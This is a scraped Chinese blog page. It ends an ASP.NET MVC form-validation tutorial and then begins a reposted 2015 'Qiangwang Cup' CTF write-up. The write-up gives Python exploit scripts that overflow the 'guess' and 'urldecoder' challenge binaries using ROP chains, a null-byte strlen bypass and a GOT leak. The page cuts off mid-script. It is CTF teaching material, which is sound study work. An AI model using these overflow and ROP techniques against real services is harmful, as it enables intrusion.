                    <span class="class">ValidationSugar</span>.<span class="class">CreateOptionItem</span>().<span class="class">Set</span>(&amp;quot;password&amp;quot;, <span class="keyword">true</span>, &amp;quot;&amp;<span class="symbol">#x5BC6</span>;&amp;<span class="symbol">#x7801</span>;&amp;quot;).<span class="class">AddRegex</span>(&amp;quot;.{<span class="number">5</span>,<span class="number">15</span>}&amp;quot;, &amp;quot;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;<span class="number">5</span>-<span class="number">15</span>&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x7B26</span>;&amp;quot;).<span class="class">ToOptionItem</span>(),
                    <span class="class">ValidationSugar</span>.<span class="class">CreateOptionItem</span>().<span class="class">Set</span>(&amp;quot;password2&amp;quot;, <span class="keyword">true</span>, &amp;quot;&amp;<span class="symbol">#x5BC6</span>;&amp;<span class="symbol">#x7801</span>;&amp;quot;).<span class="class">AddRegex</span>(&amp;quot;.{<span class="number">5</span>,<span class="number">15</span>}&amp;quot;, &amp;quot;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;<span class="number">5</span>-<span class="number">15</span>&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x7B26</span>;&amp;quot;).<span class="class">AddFunc</span>(&amp;quot;confirmPassword&amp;quot;, &amp;quot;&amp;<span class="symbol">#x5BC6</span>;&amp;<span class="symbol">#x7801</span>;&amp;<span class="symbol">#x4E0D</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x81F4</span>;&amp;quot;).<span class="class">ToOptionItem</span>(),
                     <span class="class">ValidationSugar</span>.<span class="class">CreateOptionItem</span>().<span class="class">Set</span>(&amp;quot;sex&amp;quot;, <span class="keyword">true</span>, &amp;quot;&amp;<span class="symbol">#x6027</span>;&amp;<span class="symbol">#x522B</span>;&amp;quot;).<span class="class">AddRegex</span>(&amp;quot;<span class="number">0</span>|<span class="number">1</span>&amp;quot;, &amp;quot;&amp;<span class="symbol">#x503C</span>;&amp;<span class="symbol">#x4E0D</span>;&amp;<span class="symbol">#x6B63</span>;&amp;<span class="symbol">#x786E</span>;&amp;quot;).<span class="class">ToOptionItem</span>(),
                    <span class="class">ValidationSugar</span>.<span class="class">CreateOptionItem</span>().<span class="class">Set</span>(&amp;quot;email&amp;quot;, <span class="keyword">true</span>, &amp;quot;&amp;<span class="symbol">#x90AE</span>;&amp;<span class="symbol">#x7BB1</span>;&amp;quot;).<span class="class">Add</span>(<span class="class">ValidationSugar</span>.<span class="class">OptionItemType</span>.<span class="class">Mail</span>, &amp;quot;&amp;<span class="symbol">#x90AE</span>;&amp;<span class="symbol">#x7BB1</span>;&amp;<span class="symbol">#x683C</span>;&amp;<span class="symbol">#x5F0F</span>;&amp;<span class="symbol">#x4E0D</span>;&amp;<span class="symbol">#x6B63</span>;&amp;<span class="symbol">#x786E</span>;&amp;quot;).<span class="class">ToOptionItem</span>(),
                    <span class="class">ValidationSugar</span>.<span class="class">CreateOptionItem</span>().<span class="class">Set</span>(&amp;quot;mobile&amp;quot;, <span class="keyword">false</span>, &amp;quot;&amp;<span class="symbol">#x624B</span>;&amp;<span class="symbol">#x673A</span>;&amp;quot;).<span class="class">Add</span>(<span class="class">ValidationSugar</span>.<span class="class">OptionItemType</span>.<span class="class">Mobile</span>, &amp;quot;&amp;<span class="symbol">#x624B</span>;&amp;<span class="symbol">#x673A</span>;&amp;<span class="symbol">#x683C</span>;&amp;<span class="symbol">#x5F0F</span>;&amp;<span class="symbol">#x4E0D</span>;&amp;<span class="symbol">#x6B63</span>;&amp;<span class="symbol">#x786E</span>;&amp;quot;).<span class="class">ToOptionItem</span>(),
                    <span class="class">ValidationSugar</span>.<span class="class">CreateOptionItem</span>().<span class="class">Set</span>(&amp;quot;qq&amp;quot;, <span class="keyword">false</span>, &amp;quot;qq&amp;quot;).<span class="class">AddRegex</span>(@&amp;quot;\d{<span class="number">4</span>,<span class="number">15</span>}&amp;quot;, &amp;quot;qq&amp;<span class="symbol">#x53F7</span>;&amp;<span class="symbol">#x7801</span>;&amp;<span class="symbol">#x683C</span>;&amp;<span class="symbol">#x5F0F</span>;&amp;<span class="symbol">#x4E0D</span>;&amp;<span class="symbol">#x6B63</span>;&amp;<span class="symbol">#x786E</span>;&amp;quot;).<span class="class">ToOptionItem</span>(),
                    <span class="class">ValidationSugar</span>.<span class="class">CreateOptionItem</span>().<span class="class">Set</span>(&amp;quot;education&amp;quot;, <span class="keyword">true</span>, &amp;quot;&amp;<span class="symbol">#x5B66</span>;&amp;<span class="symbol">#x5386</span>;&amp;quot;, <span class="keyword">true</span>/*checkbox &amp;<span class="symbol">#x591A</span>;&amp;<span class="symbol">#x9009</span>;&amp;<span class="symbol">#x6A21</span>;&amp;<span class="symbol">#x5F0F</span>;*/).<span class="class">AddRegex</span>(@&amp;quot;\d{<span class="number">1</span>,<span class="number">15</span>}&amp;quot;, &amp;quot;&amp;<span class="symbol">#x503C</span>;&amp;<span class="symbol">#x4E0D</span>;&amp;<span class="symbol">#x6B63</span>;&amp;<span class="symbol">#x786E</span>;&amp;quot;).<span class="class">ToOptionItem</span>()
                    );
          }
     }
}
</code></pre><h4 id="Global-cs&#x6CE8;&#x518C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x7528;&#x4E86;">Global.cs&#x6CE8;&#x518C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x7528;&#x4E86;</h4><p><img src="http://taojinke.github.io/img/20150607/cbd21c0.png" alt=""></p>
<h4 id="&#x9A8C;&#x8BC1;&#x5927;&#x591A;&#x60C5;&#x51B5;&#x4E0B;&#x5206;&#x4E24;&#x79CD;_1&#x3001;_submit&#x63D0;&#x4EA4;_2&#x3001;js_ajax&#x63D0;&#x4EA4;">&#x9A8C;&#x8BC1;&#x5927;&#x591A;&#x60C5;&#x51B5;&#x4E0B;&#x5206;&#x4E24;&#x79CD; 1&#x3001; submit&#x63D0;&#x4EA4; 2&#x3001;js ajax&#x63D0;&#x4EA4;</h4><h4 id="&#x4E00;&#x3001;submit&#x63D0;&#x4EA4;&#x7684;&#x5199;&#x6CD5;">&#x4E00;&#x3001;submit&#x63D0;&#x4EA4;&#x7684;&#x5199;&#x6CD5;</h4><p>Register &#x4E00;&#x884C;&#x4EE3;&#x7801;&#x641E;&#x5B9A;&#x3001;&#x83B7;&#x53D6;&#x7ED1;&#x5B9A;&#x4FE1;&#x606F;&#x4EA4;&#x7ED9;viewbag</p>
<p>PostRegister &#x4E5F;&#x662F;&#x4E00;&#x884C;&#x5B8C;&#x6210;&#x540E;&#x53F0;&#x9A8C;&#x8BC1;</p>
<p><img src="http://taojinke.github.io/img/20150607/cbd21c0.png" alt=""></p>
<p>view</p>
<p>1&#x3001;&#x5F15;&#x7528;js&#x5E76;&#x5199;&#x597D;&#x521D;&#x59CB;&#x5316;&#x51FD;&#x6570;</p>
<p>2&#x3001;&#x5C06;@Html.Raw(ViewBag.validationBind) &#x653E;&#x5728;&#x9875;&#x9762;&#x6700;&#x4E0B;&#x65B9;</p>
<pre><code>@{
    ViewBag.Title = &amp;quot<span class="comment">;Register&amp;quot;;</span>
    Layout = null<span class="comment">;</span>
}
&amp;lt<span class="comment">;html xmlns=&amp;quot;http://www.w3.org/1999/xhtml&amp;quot;&amp;gt;</span>
&amp;lt<span class="comment">;head&amp;gt;</span>
    &amp;lt<span class="comment">;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot; /&amp;gt;</span>
    &amp;lt<span class="comment">;script src=&amp;quot;/Content/jquery-validation-1.13.1/lib/jquery-1.9.1.js&amp;quot; type=&amp;quot;text/javascript&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;</span>
    &amp;lt<span class="comment">;script src=&amp;quot;/Content/jquery-validation-1.13.1/dist/jquery.validate.js&amp;quot; type=&amp;quot;text/javascript&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;</span>
    &amp;lt<span class="comment">;script src=&amp;quot;/Content/validation.sugar.js&amp;quot; type=&amp;quot;text/javascript&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;</span>
    &amp;lt<span class="comment">;script src=&amp;quot;/Content/jquery-validation-1.13.1/lib/jquery.form.js&amp;quot; type=&amp;quot;text/javascript&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;</span>
    &amp;lt<span class="comment">;link href=&amp;quot;/Content/jquery-validation-1.13.1/validation.sugar.css&amp;quot; rel=&amp;quot;stylesheet&amp;quot;</span>
        type=&amp;quot<span class="comment">;text/css&amp;quot; /&amp;gt;</span>
    &amp;lt<span class="comment">;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;</span>
        $(function () {
            var factory = new validateFactory($(&amp;quot<span class="comment">;form&amp;quot;), &amp;quot;&amp;lt;img src=\&amp;quot;/Content/jquery-validation-1.13.1/error.png\&amp;quot; /&amp;gt;&amp;quot;);</span>
            factory.init()<span class="comment">;</span>
        })<span class="comment">;</span>
        //&amp;#x7528<span class="comment">;&amp;#x6237;&amp;#x540D;&amp;#x662F;&amp;#x5426;&amp;#x5DF2;&amp;#x5B58;&amp;#x5728;</span>
        function checkUserName() {
            //&amp;#x5B9E<span class="comment">;&amp;#x9645;&amp;#x5F00;&amp;#x53D1;&amp;#x6362;&amp;#x6210;: ajax  async:false</span>
            var userName = $(&amp;quot<span class="comment">;[name=userName]&amp;quot;).val();</span>
            if (userName == &amp;quot<span class="comment">;admin1&amp;quot; || userName == &amp;quot;admin2&amp;quot;) {</span>
                return false<span class="comment">;</span>
            }
            return true<span class="comment">;</span>
        }
        //&amp;#x9A8C<span class="comment">;&amp;#x8BC1;&amp;#x5BC6;&amp;#x7801;&amp;#x662F;&amp;#x5426;&amp;#x4E00;&amp;#x81F4;</span>
        function confirmPassword() {
            return $(&amp;quot<span class="comment">;[name=password]&amp;quot;).val() == $(&amp;quot;[name=password2]&amp;quot;).val();</span>
        }
    &amp;lt<span class="comment">;/script&amp;gt;</span>
    &amp;lt<span class="comment">;style&amp;gt;</span>
        td
        {
            height: 30px<span class="comment">;</span>
            padding: 5px<span class="comment">;</span>
        }
    &amp;lt<span class="comment">;/style&amp;gt;</span>
&amp;lt<span class="comment">;/head&amp;gt;</span>
&amp;lt<span class="comment">;body&amp;gt;</span>
    &amp;lt<span class="comment">;h3&amp;gt;</span>
        &amp;#x57FA<span class="comment">;&amp;#x4E8E;jquery.validate&amp;#x7684;&amp;#x524D;&amp;#x540E;&amp;#x53F0;&amp;#x53CC;&amp;#x9A8C;&amp;#x8BC1;&amp;lt;/h3&amp;gt;</span>
    &amp;lt<span class="comment">;form method=&amp;quot;post&amp;quot; class=&amp;quot;form&amp;quot; id=&amp;quot;form1&amp;quot; action=&amp;quot;/home/postRegister&amp;quot;&amp;gt;</span>
    &amp;lt<span class="comment">;table&amp;gt;</span>
        &amp;lt<span class="comment">;tr&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                name
            &amp;lt<span class="comment">;/td&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                &amp;lt<span class="comment">;input type=&amp;quot;text&amp;quot; name=&amp;quot;userName&amp;quot;&amp;gt;</span>
            &amp;lt<span class="comment">;/td&amp;gt;</span>
        &amp;lt<span class="comment">;/tr&amp;gt;</span>
        &amp;lt<span class="comment">;tr&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                password
            &amp;lt<span class="comment">;/td&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                &amp;lt<span class="comment">;input type=&amp;quot;password&amp;quot; name=&amp;quot;password&amp;quot; /&amp;gt;</span>
            &amp;lt<span class="comment">;/td&amp;gt;</span>
        &amp;lt<span class="comment">;/tr&amp;gt;</span>
        &amp;lt<span class="comment">;tr&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                confirm password
            &amp;lt<span class="comment">;/td&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                &amp;lt<span class="comment">;input type=&amp;quot;password&amp;quot; name=&amp;quot;password2&amp;quot; /&amp;gt;</span>
            &amp;lt<span class="comment">;/td&amp;gt;</span>
        &amp;lt<span class="comment">;/tr&amp;gt;</span>
        &amp;lt<span class="comment">;tr&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                sex
            &amp;lt<span class="comment">;/td&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                  &amp;lt<span class="comment">;input type=&amp;quot;radio&amp;quot; value=&amp;quot;1&amp;quot; name=&amp;quot;sex&amp;quot; /&amp;gt;</span>
                    &amp;#x7537<span class="comment">;</span>
                    &amp;lt<span class="comment">;input type=&amp;quot;radio&amp;quot; value=&amp;quot;0&amp;quot; name=&amp;quot;sex&amp;quot; /&amp;gt;</span>
                    &amp;#x5973<span class="comment">;</span>
            &amp;lt<span class="comment">;/td&amp;gt;</span>
        &amp;lt<span class="comment">;/tr&amp;gt;</span>
        &amp;lt<span class="comment">;tr&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                email
            &amp;lt<span class="comment">;/td&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                &amp;lt<span class="comment">;input type=&amp;quot;text&amp;quot; name=&amp;quot;email&amp;quot; /&amp;gt;</span>
            &amp;lt<span class="comment">;/td&amp;gt;</span>
        &amp;lt<span class="comment">;/tr&amp;gt;</span>
        &amp;lt<span class="comment">;tr&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                mobile
            &amp;lt<span class="comment">;/td&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                &amp;lt<span class="comment">;input type=&amp;quot;text&amp;quot; name=&amp;quot;mobile&amp;quot; /&amp;gt;</span>
            &amp;lt<span class="comment">;/td&amp;gt;</span>
        &amp;lt<span class="comment">;/tr&amp;gt;</span>
        &amp;lt<span class="comment">;tr&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                qq
            &amp;lt<span class="comment">;/td&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                &amp;lt<span class="comment">;input type=&amp;quot;text&amp;quot; name=&amp;quot;qq&amp;quot; /&amp;gt;</span>
            &amp;lt<span class="comment">;/td&amp;gt;</span>
        &amp;lt<span class="comment">;/tr&amp;gt;</span>
        &amp;lt<span class="comment">;tr&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                education
            &amp;lt<span class="comment">;/td&amp;gt;</span>
            &amp;lt<span class="comment">;td&amp;gt;</span>
                &amp;lt<span class="comment">;p&amp;gt;</span>
                    &amp;lt<span class="comment">;input type=&amp;quot;checkbox&amp;quot; value=&amp;quot;1&amp;quot; name=&amp;quot;education&amp;quot; /&amp;gt;</span>
                    &amp;#x672C<span class="comment">;&amp;#x79D1;</span>
                    &amp;lt<span class="comment">;input type=&amp;quot;checkbox&amp;quot; value=&amp;quot;2&amp;quot; name=&amp;quot;education&amp;quot; /&amp;gt;</span>
                    &amp;#x5E7C<span class="comment">;&amp;#x513F;&amp;#x56ED;</span>
                    &amp;lt<span class="comment">;input type=&amp;quot;checkbox&amp;quot; value=&amp;quot;3&amp;quot; name=&amp;quot;education&amp;quot; /&amp;gt;</span>
                    &amp;#x5C0F<span class="comment">;&amp;#x5B66;</span>
                &amp;lt<span class="comment">;/p&amp;gt;</span>
            &amp;lt<span class="comment">;/td&amp;gt;</span>
        &amp;lt<span class="comment">;/tr&amp;gt;</span>
    &amp;lt<span class="comment">;/table&amp;gt;</span>
    &amp;lt<span class="comment">;button type=&amp;quot;submit&amp;quot;&amp;gt;</span>
        submit&amp;#x63D0<span class="comment">;&amp;#x4EA4;(&amp;#x7981;&amp;#x6389;&amp;#x6D4F;&amp;#x89C8;&amp;#x5668;JS&amp;#x8FDB;&amp;#x884C;&amp;#x6D4B;&amp;#x8BD5;)&amp;lt;/button&amp;gt;</span>
    @Html.Raw(ViewBag.validationBind)
    &amp;lt<span class="comment">;/form&amp;gt;</span>
&amp;lt<span class="comment">;/body&amp;gt;</span>
&amp;lt<span class="comment">;/html&amp;gt;</span>
</code></pre><h4 id="&#x5B8C;&#x6210;">&#x5B8C;&#x6210;</h4><p>&#x8868;&#x5355;&#x96BE;&#x770B;&#x4E86;&#x70B9;,&#x529F;&#x80FD;&#x9F50;&#x5168;,&#x57FA;&#x4E8E;validate.js&#x5BF9;css&#x652F;&#x6301;&#x8FD8;&#x662F;&#x4E0D;&#x9519;&#x7684;&#x53EF;&#x4EE5;&#x3002;&#x81EA;&#x5DF2;&#x7F8E;&#x5316;</p>
<p><img src="http://taojinke.github.io/img/20150607/cbd2431.png" alt=""></p>
<h4 id="&#x4E8C;&#x3001;ajax&#x5199;&#x6CD5;">&#x4E8C;&#x3001;ajax&#x5199;&#x6CD5;</h4><p>&#x628A;submit&#x6539;&#x6210;button,&#x5176;&#x5B83;&#x90FD;&#x4E00;&#x6837;&#x5C31;&#x591A;&#x4E86;&#x8FD9;&#x4E48;&#x4E00;&#x70B9;&#x4EE3;&#x7801; </p>
<p><img src="http://taojinke.github.io/img/20150607/cbd2431.png" alt=""></p>
<p>DEMO&#x4E0B;&#x8F7D;&#xFF1A;</p>
<p><a href="http://git.oschina.net/sunkaixuan/ValidationSuarMVC" target="_blank" rel="external">http://git.oschina.net/sunkaixuan/ValidationSuarMVC</a></p>
<p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/iqQ3Un">6.1.2 &#x5B9A;&#x4E49;&#x591A;&#x4E2A;&#x5C5E;&#x6027;</a></li>
<li>2.<a href="/articles/bui6Rrq">&#x5E38;&#x7528;&#x8DE8;&#x57DF;&#x65B9;&#x6CD5;&#x5B9E;&#x8DF5;&#xFF08;&#x4E00;&#xFF09;</a></li>
<li>3.<a href="/articles/Mzqyaay">&#x524D;&#x7AEF;&#x5F00;&#x53D1;&#x9762;&#x8BD5;&#x5C0F;&#x7ED3;</a></li>
<li>4.<a href="/articles/MjYZvm3">chrome&#x6269;&#x5C55;&#x5E94;&#x7528;&#x5F00;&#x53D1;&#x6559;&#x7A0B;&#x4E4B;&#x5F00;&#x53D1;chrome&#x5E94;&#x7528;&#x57FA;&#x7840;</a></li>
<li>5.<a href="/articles/FvUfAzE">[Network] HTML&#x3001;XML&#x548C;JSON&#x5B66;&#x4E60;&#x6C47;&#x603B;</a></li>
<li><p>6.<a href="/articles/NjA3Yzn">JavaScript OOP &#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#x7684;7&#x79CD;&#x65B9;&#x5F0F;</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/I7FrQ3j">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;I7FrQ3j&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/Html/">Html</a><a href="/tags/JavaScript/">JavaScript</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/2fe013c/" title="“强网杯”网络安全挑战赛WriteUp -" itemprop="url">“强网杯”网络安全挑战赛WriteUp -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-06T23:06:03.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="&#x201C;&#x5F3A;&#x7F51;&#x676F;&#x201D;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x6311;&#x6218;&#x8D5B;WriteUp">&#x201C;&#x5F3A;&#x7F51;&#x676F;&#x201D;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x6311;&#x6218;&#x8D5B;WriteUp</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 11:53:20  <a href="/sites/MNnABb">FreeBuf</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.freebuf.com/articles/web/69260.html?utm_source=tuicool" target="_blank" rel="external">http://www.freebuf.com/articles/web/69260.html</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/10000101">&#x7F51;&#x7EDC;&#x5B89;&#x5168;</a><a href="/topics/11100078">&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;</a></p>
<p>  &#x201C;&#x5F3A;&#x7F51;&#x676F;&#x201D;&#x6311;&#x6218;&#x8D5B;&#x662F;&#x9762;&#x5411;&#x56FD;&#x5185;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x4F01;&#x4E1A;&#xFF08;&#x56E2;&#x961F;&#xFF09;&#x548C;&#x9AD8;&#x7B49;&#x9662;&#x6821;&#x7684;&#x56FD;&#x5BB6;&#x7EA7;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x8D5B;&#x4E8B;&#xFF0C;&#x4E5F;&#x662F;&#x7B2C;&#x4E8C;&#x5C4A;&#x56FD;&#x5BB6;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x5BA3;&#x4F20;&#x5468;&#x7684;&#x91CD;&#x8981;&#x6D3B;&#x52A8;&#x4E4B;&#x4E00;&#x3002;</p>
<h4 id="Guess">Guess</h4><h4 id="&#x6EA2;&#x51FA;&#x70B9;&#xFF1A;">&#x6EA2;&#x51FA;&#x70B9;&#xFF1A;</h4><p>&#x7A0B;&#x5E8F;&#x662F;&#x4E2A;&#x6309;&#x56FE;&#x56DE;&#x7B54;&#x7684;&#x6E38;&#x620F;&#xFF0C;&#x6E38;&#x620F;&#x901A;&#x5173;&#x540E;&#x4F1A;&#x8BA9;&#x8F93;&#x5165;&#x90AE;&#x7BB1;&#xFF0C;&#x4F1A;&#x6253;&#x5370;</p>
<p>Thank you so much! I will send you a gift, bye!</p>
<p>&#x6700;&#x5F00;&#x59CB;&#x624B;&#x8BD5;&#x4E86;&#x4E24;&#x628A;&#xFF0C;&#x8F93;&#x5165;&#x6B63;&#x786E;&#x7684;&#x90AE;&#x7BB1;&#xFF0C;&#x4F46;&#x662F;flag&#x90FD;&#x6CA1;&#x6709;&#x53D1;&#x5230;&#x90AE;&#x7BB1;&#x91CC;&#x3002;</p>
<p>&#x4ED4;&#x7EC6;&#x770B;&#x7A0B;&#x5E8F;&#xFF0C;&#x624D;&#x53D1;&#x73B0;&#x662F;&#x4E2A;&#x6808;&#x6EA2;&#x51FA;&#x3002;</p>
<p><img src="http://taojinke.github.io/img/20150607/2fd9f94.jpg" alt=""></p>
<h4 id="&#x5229;&#x7528;&#xFF1A;">&#x5229;&#x7528;&#xFF1A;</h4><p>&#x8FD9;&#x4E2A;&#x7A0B;&#x5E8F;&#x6CA1;&#x6709;&#x7ED9;libc&#x5E93;&#xFF0C;&#x8981;&#x62FF;shell&#x6BD4;&#x8F83;&#x56F0;&#x96BE;&#xFF0C;&#x4E0D;&#x8FC7;&#x7A0B;&#x5E8F;&#x4E2D;&#x6709;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x7684;&#x51FD;&#x6570;&#xFF0C;</p>
<p><img src="http://taojinke.github.io/img/20150607/2fda205.jpg" alt=""></p>
<p>&#x6240;&#x4EE5;&#x76F4;&#x63A5;&#x6784;&#x9020;rop&#x53BB;&#x8BFB;&#x53D6;flag&#x6587;&#x4EF6;&#x3002;</p>
<h4 id="&#x5229;&#x7528;&#x811A;&#x672C;&#xFF1A;">&#x5229;&#x7528;&#x811A;&#x672C;&#xFF1A;</h4><pre><code>from zio <span class="built_in">import</span> <span class="built_in">*</span>
target = <span class="params">(&amp;apos;<span class="number">119.254</span>.<span class="number">101.197</span>&amp;apos;,<span class="number">10000</span>)</span>
<span class="built_in">#</span>target = &amp;apos;./guess&amp;apos;
def <span class="built_in">exp</span><span class="params">(target)</span>:
    io = zio<span class="params">(target, timeout=<span class="number">10000</span>, print_read=COLORED<span class="params">(RAW, &amp;apos;red&amp;apos;)</span>, print_write=COLORED<span class="params">(RAW, &amp;apos;green&amp;apos;)</span>)</span>
    io.gdb_hint<span class="params">()</span>
    d = io.read_until<span class="params">(&amp;apos;What&amp;apos;)</span>.split<span class="params">(&amp;apos;What&amp;apos;)</span>[<span class="number">0</span>]
    addr = <span class="number">0</span>x08048830
    io.writeline<span class="params">(&amp;apos;a&amp;apos;*<span class="number">0</span>x9c+l32<span class="params">(addr)</span>+l32<span class="params">(<span class="number">0</span>)</span>+l32<span class="params">(<span class="number">0</span>x0804A100)</span>)</span>
    io.read_until<span class="params">(&amp;apos;!\n&amp;apos;)</span>
    <span class="built_in">#</span><span class="keyword">for</span> i in range<span class="params">(<span class="number">9</span>)</span>:
    <span class="keyword">for</span> i in range<span class="params">(<span class="number">5</span>)</span>:
        d = io.read_until<span class="params">(&amp;apos;What&amp;apos;)</span>.split<span class="params">(&amp;apos;What&amp;apos;)</span>[<span class="number">0</span>]
        <span class="keyword">if</span> &amp;apos;quu&amp;apos; in d:
            io.writeline<span class="params">(&amp;apos;pikachu&amp;apos;)</span>
        elif &amp;apos;COOL&amp;apos; in d:
            io.writeline<span class="params">(&amp;apos;peanuts&amp;apos;)</span>
        elif &amp;apos;bug&amp;apos; in d:
            io.writeline<span class="params">(&amp;apos;batman&amp;apos;)</span>
        elif &amp;apos;<span class="number">88888888888</span>&amp;apos; in d:
            io.writeline<span class="params">(&amp;apos;linux&amp;apos;)</span>
        elif &amp;apos;==o==&amp;apos; in d:
            io.writeline<span class="params">(&amp;apos;superman&amp;apos;)</span>
    io.read_until<span class="params">(&amp;apos;email:&amp;apos;)</span>
    io.writeline<span class="params">(&amp;apos;flag&amp;apos;)</span>
    io.interact<span class="params">()</span>
<span class="built_in">exp</span><span class="params">(target)</span>
</code></pre><h4 id="urldecoder">urldecoder</h4><p>&#x5728;url&#x89E3;&#x7801;&#x51FD;&#x6570;&#x4E2D;&#x867D;&#x7136;&#x5BF9;&#x957F;&#x5EA6;&#x505A;&#x4E86;&#x9650;&#x5236;&#xFF0C;&#x4E0D;&#x8FC7;&#x5BF9;%&#x540E;&#x9762;&#x7684;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x6CA1;&#x6709;&#x505A;&#x4E25;&#x683C;&#x7684;&#x5224;&#x65AD;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5728;%&#x540E;&#x9762;&#x7684;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E2D;&#x653E;&#x4E00;&#x4E2A;\x00&#x7ED5;&#x8FC7;strlen&#x7684;&#x5224;&#x65AD;&#xFF0C;&#x4ECE;&#x800C;&#x6808;&#x6EA2;&#x51FA;&#x3002;</p>
<p><img src="http://taojinke.github.io/img/20150607/2fda205.jpg" alt=""></p>
<p><img src="http://taojinke.github.io/img/20150607/2fda476.jpg" alt=""></p>
<pre><code>&amp;#x811A<span class="comment">;&amp;#x672C;&amp;#x5982;&amp;#x4E0B;&amp;#xFF1A;</span>
from zio import *
target = <span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;119.254.101.197&amp;apos;,10001)</span>
#target = <span class="keyword">&amp;apos</span><span class="comment">;./urldecoder&amp;apos;</span>
def exp<span class="list">(<span class="keyword">target</span>)</span>:
     io = zio<span class="list">(<span class="keyword">target</span>, timeout=10000, print_read=COLORED<span class="list">(<span class="keyword">RAW</span>, <span class="keyword">&amp;apos</span><span class="comment">;red&amp;apos;), print_write=COLORED(RAW, &amp;apos;green&amp;apos;))</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;URL:&amp;apos;)</span>
     pop_ebp_ret    = <span class="number">0</span>x080488D2
     puts_plt = <span class="number">0</span>x08048530
     puts_got = <span class="number">0</span>x08049DE8
     read_fun = <span class="number">0</span>x08048720
     main = <span class="number">0</span>x08048590
     payload = <span class="keyword">&amp;apos</span><span class="comment">;http://%\x32\x00&amp;apos;+&amp;apos;a&amp;apos;*0x94 + l32(puts_plt) + l32(pop_ebp_ret) + l32(puts_got)</span>
     payload += l32<span class="list">(<span class="keyword">main</span>)</span>
     payload += <span class="keyword">&amp;apos</span><span class="comment">;\x00&amp;apos;</span>
     io.writeline<span class="list">(<span class="keyword">payload</span>)</span>
     io.read_until<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;\n&amp;apos;)</span>
